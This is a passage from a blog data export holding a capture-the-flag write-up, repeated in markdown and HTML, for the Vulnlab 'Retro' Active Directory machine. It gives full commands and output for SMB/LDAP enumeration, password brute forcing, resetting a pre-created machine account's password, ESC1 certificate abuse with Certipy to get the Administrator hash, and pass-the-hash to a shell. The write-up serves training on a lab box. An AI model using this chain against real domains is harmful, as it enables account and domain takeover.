Wiki though that there is a hint to pre-created computer accounts article that can be found [here](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts). This essentially explains that machine accounts that have the `Assign this computer account as a pre-Windows 2000 computer` option enabled on their account, then they'll have the same password as their regular username (excluding the `$`). This is only the case if the administrator did not opt to assigning the account a random password.\n\n```\nThe **Assign this computer account as a pre-Windows 2000 computer** check box assigns a password that is based on the new computer name. If you do not select this check box, you are assigned a random password.\n```\n\nWe can verify that we are correct about our theory by running a `crackmapexec` check with creds to the same credentials.\n\n```\n┌──(daz㉿kali)-[~/tech/vl/retro/dump]\n└─$ crackmapexec smb 10.10.124.140 -u 'banking$' -p 'banking'\nSMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.124.140   445    DC               [-] retro.vl\\banking$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT\n```\n\nYou'll notice that we'll receive an error that is not a regular authentication error, and instead is `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`. This does not mean the credentials are incorrect, and instead means that the domain does not trust this machine account.\n\nDespite that, we technically have a credentials though they aren't actually valid. I found that our next avenue to exploitation is ADCS, but if we try to run any queries to ADCS we'll come back with an invalid credential error.\n\nSo the big thing here is that we'll need to reset this machine accounts password using `Impacket` to obtain credentials that we can actually use. There's a tool called `impacket-changepasswd` that does the trick with us - we'll just need to use the trainee creds that we have access to.\n\n```\n└─$ impacket-changepasswd retro.vl/banking$:banking@10.10.124.140 -dc-ip 10.10.124.140 -altuser \"trainee\" -altpass \"trainee\" -newpass daz\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[!] Attempting to *change* the password of retro.vl/banking$ as retro.vl/trainee. You may want to use '-reset' to *reset* the password of the target.\n[*] Changing the password of retro.vl\\banking$\n[*] Connecting to DCE/RPC as retro.vl\\trainee\n[*] Password was changed successfully.\n```\n\nWe can see that the password was changed successfully, and we'll run another `crackmapexec` command to see if anything has changed.\n\n```\n└─$ crackmapexec smb 10.10.124.140 -u 'banking$' -p 'daz' \nSMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.124.140   445    DC               [+] retro.vl\\banking$:daz\n```\n\nLooks like the password change method worked out, we can now progress to ADCS.\n\n# ESC1 ADCS Exploitation\n\nI've covered ADCS in my [Hybrid](https://dan-feliciano.com/writeups/hybrid/) writeup previously, and given that we have credentials we can potentially look for any certificates that we can abuse. ADCS is essentially a server role that allows administrators to integrate PKI (Public Key Infrastructure) into their AD environment for digital signature/certificate capabilities. They then allow these same certificates to be used to authenticate and access domain resources on behalf of a user. In our case, we can request a certificate for the `Administrator` machine account on behalf of the `BANKING$` user.\n\nThe tool to abuse this is [Certipy](https://github.com/ly4k/Certipy) (on Linux), if we were on a Windows machine we'd use [Certify](https://github.com/GhostPack/Certify).\n\n```\n└─$ certipy-ad find -username 'banking$'@retro.vl -password 'daz' -dc-ip 10.10.124.140 -vulnerable -enabled\n```\n\nIt will save the responding certificates that we are able to exploit into a file after the command has finished. (I took a break at this point, so the IP address will change)\n\n```\n    Template Name                       : RetroClients\n    Display Name                        : Retro Clients\n    Certificate Authorities             : retro-DC-CA\n    Enabled                             : True\n    Client Authentication               : True\n[...snip...]\n    [!] Vulnerabilities\n      ESC1                              : 'RETRO.VL\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication\n```\n\nThe certificate tells us that all domain computers can enroll in this template and that it requires client authentication. Given that we have a domain computer account `banking$`, all that's required is to request this certificate on behalf of another user. Since we are allowed to request this on behalf of any user, let's do this for the Administrator user.\n\nNote that you will need to adjust the `-key-size` option to a value higher than `4096` to prevent a NetBIOS error.\n\n```\n└─$ certipy-ad req -u 'banking$'@retro.vl -p 'daz' -dc-ip 10.10.111.59 -target DC.retro.vl -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -key-size 4096\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 9\n[*] Got certificate with UPN 'Administrator@retro.vl'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n```\n\nThis `.pfx` file is a joined file that includes the certificate along with the private key for this user. We can use this `.pfx` file to authenticate and retrieve the Administrator user's NTLM hash.\n\n```\n└─$ certipy-ad auth -dc-ip 10.10.111.59 -domain 'retro.vl' -username Administrator -pfx administrator.pfx\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@retro.vl\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:[...snip...]\n```\n\nThis has returned the NTLM hash for the Administrator user, now all that is left is to pass the hash and authenticate to the machine as them! Note that we can't use WinRM as I believe it isn't on the machine (at least I was running into issues on my end during the time of this writeup). We can use `smbexec` as a substitute to launch a shell.\n\n```\n└─$ impacket-smbexec -shell-type powershell -dc-ip 10.10.111.59 -hashes :[...snip...] retro.vl/Administrator@10.10.111.59\n```\n\nNote that the shell is relatively slow, but if you cat out the directory of the root flag you should be able to retrieve it after a few seconds. An alternative to this is to use `impacket-smbclient`, it's up to you.\n\n![](/images/vulnlab/retro-vl/b.jpg)\n\nThis means we have successfully rooted the machine!\n\n# Conclusion\n\nThis box is also very useful for AD basics and understanding what you have access to. Credential usage is also something that you can test in red-teaming scenarios, though the success-rate may be very slim. Nonetheless when it does work, it can result in something similar to the above. Big thanks to r0BIT for the development of this machine - it helped a lot with practice!\n\n# Resources\n\nhttps://dan-feliciano.com/writeups/baby\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts\nhttps://dan-feliciano.com/writeups/hybrid/\nhttps://github.com/ly4k/Certipy\nhttps://github.com/GhostPack/Certify","slug":"retro","published":1,"updated":"2024-06-05T20:04:40.789Z","_id":"clx25k01g0000dbuf0icue0m7","comments":1,"layout":"post","photos":[],"content":"<p>This machine is another Active Directory machine, and mimics what you might see in an environment where interns and trainees are given a universal account to use in AD. This has it’s own security issues, to which we’ll exploit today.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our usual NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 16:20 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.124.140</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 988 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 18.56 seconds</span><br></pre></td></tr></table></figure>\n\n<p>As explained earlier, we seem to have another AD machine similar to <a href=\"http://dan-feliciano.com/writeups/baby\">Baby</a>. There is no external-facing webserver, so let’s start with SMB and then followed by LDAP. We’ll see if there’s any way for us to authenticate with null credentials to the SMB server.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.124.140 -N</span><br><span class=\"line\"></span><br><span class=\"line\">        Sharename       Type      Comment</span><br><span class=\"line\">        ---------       ----      -------</span><br><span class=\"line\">        ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">        C$              Disk      Default share</span><br><span class=\"line\">        IPC$            IPC       Remote IPC</span><br><span class=\"line\">        NETLOGON        Disk      Logon server share </span><br><span class=\"line\">        Notes           Disk      </span><br><span class=\"line\">        SYSVOL          Disk      Logon server share </span><br><span class=\"line\">        Trainees        Disk      </span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.124.140 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>Aside from the regular shares such as <code>ADMIN$</code> or <code>NETLOGON</code>, we can see that there is a <code>Notes</code> and <code>Trainees</code> share, which are not usually here and were probably set up by an administrator. We’ll run some more <code>smbclient</code> commands to authenticate to these shares to see if we can view the contents of them.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient \\\\\\\\10.10.124.140\\\\trainees -N</span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sun Jul 23 17:58:43 2023</span><br><span class=\"line\">  ..                                DHS        0  Wed Jul 26 05:54:14 2023</span><br><span class=\"line\">  Important.txt                       A      288  Sun Jul 23 18:00:13 2023</span><br><span class=\"line\"></span><br><span class=\"line\">                6261499 blocks of size 4096. 2222845 blocks available</span><br><span class=\"line\">smb: \\&gt; </span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice an <code>Important.txt</code> file in the <code>trainees</code> share, which we can download with <code>smb: \\&gt; get Important.txt</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat Important.txt                           </span><br><span class=\"line\">Dear Trainees,</span><br><span class=\"line\"></span><br><span class=\"line\">I know that some of you seemed to struggle with remembering strong and unique passwords.</span><br><span class=\"line\">So we decided to bundle every one of you up into one account.</span><br><span class=\"line\">Stop bothering us. Please. We have other stuff to do than resetting your password every day.</span><br><span class=\"line\"></span><br><span class=\"line\">Regards</span><br><span class=\"line\"></span><br><span class=\"line\">The Admins</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though a trainee account has been given to all of the interns&#x2F;trainees that are potentially being onboarded to the organization. The administrator proclaims that a universal username and password has been given to these users, which is something that we can try to retrieve from LDAP.</p>\n<h1 id=\"LDAP-Foothold\"><a href=\"#LDAP-Foothold\" class=\"headerlink\" title=\"LDAP Foothold\"></a>LDAP Foothold</h1><p>If you didn’t notice from earlier, we were able to authenticate to SMB with null credentials. You can also verify this by running <code>crackmapexec</code> against SMB, in which it should tell us that we have valid authentication as any user. I used the <code>Guest</code> user account with no password to replicate this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.124.140 -u &#x27;Guest&#x27; -p &#x27;&#x27;</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [+] retro.vl\\Guest:</span><br></pre></td></tr></table></figure>\n\n<p>Let’s see if we can do the same with LDAP. Reminder that you’ll need to make sure that <code>dc.retro.vl</code> and <code>retro.vl</code> are bound to the IP address of the machine, you can find that information if you run an aggressive NMAP scan against the LDAP ports.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.124.140 -u &#x27;Guest&#x27; -p &#x27;&#x27;</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.124.140   445    DC               [-] Error in searchRequest -&gt; operationsError: 000004DC: LdapErr: DSID-0C090AC9, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c</span><br><span class=\"line\">LDAP        10.10.124.140   389    DC               [+] retro.vl\\Guest:</span><br></pre></td></tr></table></figure>\n\n<p>Despite LDAP telling us that we’ll need to perform a successful bind to LDAP, it still says that our credentials are valid.</p>\n<p>This is great, because all we’re looking for right now is the account username for the trainees. We can use <code>impacket-lookupsid</code>, which will brute force any domain SIDs that correspond to valid domain users within the AD instance. There’s also an option if we want to specify for this utility to connect to SMB for it’s scan, but we won’t need to do that and can leave it blank.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-lookupsid retro.vl/&#x27;Guest&#x27;@10.10.124.140 -domain-sids -no-pass</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Brute forcing SIDs at 10.10.124.140</span><br><span class=\"line\">[*] StringBinding ncacn_np:10.10.124.140[\\pipe\\lsarpc]</span><br><span class=\"line\">[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">1104: RETRO\\trainee (SidTypeUser)</span><br><span class=\"line\">1106: RETRO\\BANKING$ (SidTypeUser)</span><br><span class=\"line\">1107: RETRO\\jburley (SidTypeUser)</span><br><span class=\"line\">1108: RETRO\\HelpDesk (SidTypeGroup)</span><br><span class=\"line\">1109: RETRO\\tblack (SidTypeUser)</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that it returned a few users, notably <code>BANKING$</code>(a machine account) and user accounts such as <code>jburley</code> and <code>tblack</code>. It also found a domain user named <code>trainee</code>, which we can assume is the universal trainee account that we’re looking for.</p>\n<h1 id=\"Getting-User-Credentials\"><a href=\"#Getting-User-Credentials\" class=\"headerlink\" title=\"Getting User Credentials\"></a>Getting User Credentials</h1><p>Now based off of the text file we found in the SMB server, we know that the passwords were changed so that they are easy to remember. This means we could potentially brute force for them, which I’ve left an example command below as to what you’d need to brute force it with <code>Hydra</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hydra -l &#x27;trainee&#x27; -P /usr/share/wordlists/rockyou.txt ldap2://dc.retro.vl:389 -V</span><br></pre></td></tr></table></figure>\n\n<p>However you’ll probably be sitting here for a while before <code>Hydra</code> returns with an empty string as the password (at least for SMB). Remember that this doesn’t tell us anything, as we were allowed to authenticate successfully to both SMB and LDAP with null credentials despite them not being the correct way to authenticate.</p>\n<p>Doing some testing around you might find that you already are looking at the password. In our case, the administrator made the password very easy to remember, being the same string as the username <code>trainee:trainee</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap dc.retro.vl -u &#x27;trainee&#x27; -p &#x27;trainee&#x27;</span><br><span class=\"line\">SMB         retro.vl        445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        retro.vl        389    DC               [+] retro.vl\\trainee:trainee</span><br></pre></td></tr></table></figure>\n\n<p>So with that, we now have credentials that we can use for the LDAP service, however first we can actually look at the <code>Notes</code> share that we couldn’t go into before now that we have proper credentials. You’ll find a text file in there named <code>ToDo.txt</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Thomas,</span><br><span class=\"line\"></span><br><span class=\"line\">after convincing the finance department to get rid of their ancienct banking software</span><br><span class=\"line\">it is finally time to clean up the mess they made. We should start with the pre created</span><br><span class=\"line\">computer account. That one is older than me.</span><br><span class=\"line\"></span><br><span class=\"line\">Best</span><br><span class=\"line\"></span><br><span class=\"line\">James</span><br></pre></td></tr></table></figure>\n\n<p>These users both correspond to <code>tblack</code> and <code>jburley</code>, and the pre-created computer account they are referring to is the <code>BANKING$</code> machine account we saw in our <code>lookupsid</code> command output.</p>\n<p>So from here we don’t really have many leads except for one - we have some user accounts that we need to get access to as well proper user credentials to the <code>trainee</code> account. Let’s see if we can find anything in <a href=\"https://github.com/dirkjanm/BloodHound.py\">Bloodhound</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;retro.vl&#x27; -u &#x27;trainee&#x27; -p &#x27;trainee&#x27; -c all -ns 10.10.124.140 --zip --use-ldaps</span><br></pre></td></tr></table></figure>\n\n<p>Though you’ll notice that our <code>trainee</code> user does not seem to have control over any objects that could lead us to compromise another account.</p>\n<h1 id=\"Pre-Installed-Machine-Accounts\"><a href=\"#Pre-Installed-Machine-Accounts\" class=\"headerlink\" title=\"Pre-Installed Machine Accounts\"></a>Pre-Installed Machine Accounts</h1><p>You’ll notice on the Wiki though that there is a hint to pre-created computer accounts article that can be found <a href=\"https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts\">here</a>. This essentially explains that machine accounts that have the <code>Assign this computer account as a pre-Windows 2000 computer</code> option enabled on their account, then they’ll have the same password as their regular username (excluding the <code>$</code>). This is only the case if the administrator did not opt to assigning the account a random password.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">The **Assign this computer account as a pre-Windows 2000 computer** check box assigns a password that is based on the new computer name. If you do not select this check box, you are assigned a random password.</span><br></pre></td></tr></table></figure>\n\n<p>We can verify that we are correct about our theory by running a <code>crackmapexec</code> check with creds to the same credentials.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(daz㉿kali)-[~/tech/vl/retro/dump]</span><br><span class=\"line\">└─$ crackmapexec smb 10.10.124.140 -u &#x27;banking$&#x27; -p &#x27;banking&#x27;</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [-] retro.vl\\banking$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice that we’ll receive an error that is not a regular authentication error, and instead is <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>. This does not mean the credentials are incorrect, and instead means that the domain does not trust this machine account.</p>\n<p>Despite that, we technically have a credentials though they aren’t actually valid. I found that our next avenue to exploitation is ADCS, but if we try to run any queries to ADCS we’ll come back with an invalid credential error.</p>\n<p>So the big thing here is that we’ll need to reset this machine accounts password using <code>Impacket</code> to obtain credentials that we can actually use. There’s a tool called <code>impacket-changepasswd</code> that does the trick with us - we’ll just need to use the trainee creds that we have access to.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-changepasswd retro.vl/banking$:banking@10.10.124.140 -dc-ip 10.10.124.140 -altuser &quot;trainee&quot; -altpass &quot;trainee&quot; -newpass daz</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[!] Attempting to *change* the password of retro.vl/banking$ as retro.vl/trainee. You may want to use &#x27;-reset&#x27; to *reset* the password of the target.</span><br><span class=\"line\">[*] Changing the password of retro.vl\\banking$</span><br><span class=\"line\">[*] Connecting to DCE/RPC as retro.vl\\trainee</span><br><span class=\"line\">[*] Password was changed successfully.</span><br></pre></td></tr></table></figure>\n\n<p>We can see that the password was changed successfully, and we’ll run another <code>crackmapexec</code> command to see if anything has changed.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.124.140 -u &#x27;banking$&#x27; -p &#x27;daz&#x27; </span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.124.140   445    DC               [+] retro.vl\\banking$:daz</span><br></pre></td></tr></table></figure>\n\n<p>Looks like the password change method worked out, we can now progress to ADCS.</p>\n<h1 id=\"ESC1-ADCS-Exploitation\"><a href=\"#ESC1-ADCS-Exploitation\" class=\"headerlink\" title=\"ESC1 ADCS Exploitation\"></a>ESC1 ADCS Exploitation</h1><p>I’ve covered ADCS in my <a href=\"https://dan-feliciano.com/writeups/hybrid/\">Hybrid</a> writeup previously, and given that we have credentials we can potentially look for any certificates that we can abuse. ADCS is essentially a server role that allows administrators to integrate PKI (Public Key Infrastructure) into their AD environment for digital signature&#x2F;certificate capabilities. They then allow these same certificates to be used to authenticate and access domain resources on behalf of a user. In our case, we can request a certificate for the <code>Administrator</code> machine account on behalf of the <code>BANKING$</code> user.</p>\n<p>The tool to abuse this is <a href=\"https://github.com/ly4k/Certipy\">Certipy</a> (on Linux), if we were on a Windows machine we’d use <a href=\"https://github.com/GhostPack/Certify\">Certify</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad find -username &#x27;banking$&#x27;@retro.vl -password &#x27;daz&#x27; -dc-ip 10.10.124.140 -vulnerable -enabled</span><br></pre></td></tr></table></figure>\n\n<p>It will save the responding certificates that we are able to exploit into a file after the command has finished. (I took a break at this point, so the IP address will change)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">    Template Name                       : RetroClients</span><br><span class=\"line\">    Display Name                        : Retro Clients</span><br><span class=\"line\">    Certificate Authorities             : retro-DC-CA</span><br><span class=\"line\">    Enabled                             : True</span><br><span class=\"line\">    Client Authentication               : True</span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">    [!] Vulnerabilities</span><br><span class=\"line\">      ESC1                              : &#x27;RETRO.VL\\\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure>\n\n<p>The certificate tells us that all domain computers can enroll in this template and that it requires client authentication. Given that we have a domain computer account <code>banking$</code>, all that’s required is to request this certificate on behalf of another user. Since we are allowed to request this on behalf of any user, let’s do this for the Administrator user.</p>\n<p>Note that you will need to adjust the <code>-key-size</code> option to a value higher than <code>4096</code> to prevent a NetBIOS error.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad req -u &#x27;banking$&#x27;@retro.vl -p &#x27;daz&#x27; -dc-ip 10.10.111.59 -target DC.retro.vl -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -key-size 4096</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Requesting certificate via RPC</span><br><span class=\"line\">[*] Successfully requested certificate</span><br><span class=\"line\">[*] Request ID is 9</span><br><span class=\"line\">[*] Got certificate with UPN &#x27;Administrator@retro.vl&#x27;</span><br><span class=\"line\">[*] Certificate has no object SID</span><br><span class=\"line\">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>This <code>.pfx</code> file is a joined file that includes the certificate along with the private key for this user. We can use this <code>.pfx</code> file to authenticate and retrieve the Administrator user’s NTLM hash.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad auth -dc-ip 10.10.111.59 -domain &#x27;retro.vl&#x27; -username Administrator -pfx administrator.pfx</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Using principal: administrator@retro.vl</span><br><span class=\"line\">[*] Trying to get TGT...</span><br><span class=\"line\">[*] Got TGT</span><br><span class=\"line\">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class=\"line\">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class=\"line\">[*] Got hash for &#x27;administrator@retro.vl&#x27;: aad3b435b51404eeaad3b435b51404ee:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>This has returned the NTLM hash for the Administrator user, now all that is left is to pass the hash and authenticate to the machine as them! Note that we can’t use WinRM as I believe it isn’t on the machine (at least I was running into issues on my end during the time of this writeup). We can use <code>smbexec</code> as a substitute to launch a shell.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-smbexec -shell-type powershell -dc-ip 10.10.111.59 -hashes :[...snip...] retro.vl/Administrator@10.10.111.59</span><br></pre></td></tr></table></figure>\n\n<p>Note that the shell is relatively slow, but if you cat out the directory of the root flag you should be able to retrieve it after a few seconds. An alternative to this is to use <code>impacket-smbclient</code>, it’s up to you.</p>\n<p><img src=\"/images/vulnlab/retro-vl/b.jpg\"></p>\n<p>This means we have successfully rooted the machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This box is also very useful for AD basics and understanding what you have access to. Credential usage is also something that you can test in red-teaming scenarios, though the success-rate may be very slim. Nonetheless when it does work, it can result in something similar to the above. Big thanks to r0BIT for the development of this machine - it helped a lot with practice!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://dan-feliciano.com/writeups/baby\">https://dan-feliciano.com/writeups/baby</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts\">https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts</a><br><a href=\"https://dan-feliciano.com/writeups/hybrid/\">https://dan-feliciano.com/writeups/hybrid/</a><br><a href=\"https://github.com/ly4k/Certipy\">https://github.com/ly4k/Certipy</a><br><a href=\"https://github.com/GhostPack/Certify\">https://github.com/GhostPack/Certify</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This machine is another Active Directory machine, and mimics what you might see in an environment where interns and trainees are given a universal account to use in AD. This has it’s own security issues, to which we’ll exploit today.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with our usual NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 16:20 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.124.140</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 988 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 18.56 seconds</span><br></pre></td></tr></table></figure>\n\n<p>As explained earlier, we seem to have another AD machine similar to <a href=\"http://dan-feliciano.com/writeups/baby\">Baby</a>. There is no external-facing webserver, so let’s start with SMB and then followed by LDAP. We’ll see if there’s any way for us to authenticate with null credentials to the SMB server.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.124.140 -N</span><br><span class=\"line\"></span><br><span class=\"line\">        Sharename       Type      Comment</span><br><span class=\"line\">        ---------       ----      -------</span><br><span class=\"line\">        ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">        C$              Disk      Default share</span><br><span class=\"line\">        IPC$            IPC       Remote IPC</span><br><span class=\"line\">        NETLOGON        Disk      Logon server share </span><br><span class=\"line\">        Notes           Disk      </span><br><span class=\"line\">        SYSVOL          Disk      Logon server share </span><br><span class=\"line\">        Trainees        Disk      </span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.124.140 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>Aside from the regular shares such as <code>ADMIN$</code> or <code>NETLOGON</code>, we can see that there is a <code>Notes</code> and <code>Trainees</code> share, which are not usually here and were probably set up by an administrator. We’ll run some more <code>smbclient</code> commands to authenticate to these shares to see if we can view the contents of them.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient \\\\\\\\10.10.124.140\\\\trainees -N</span><br><span class=\"line\">Try &quot;help&quot; to get a list of possible commands.</span><br><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sun Jul 23 17:58:43 2023</span><br><span class=\"line\">  ..                                DHS        0  Wed Jul 26 05:54:14 2023</span><br><span class=\"line\">  Important.txt                       A      288  Sun Jul 23 18:00:13 2023</span><br><span class=\"line\"></span><br><span class=\"line\">                6261499 blocks of size 4096. 2222845 blocks available</span><br><span class=\"line\">smb: \\&gt; </span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice an <code>Important.txt</code> file in the <code>trainees</code> share, which we can download with <code>smb: 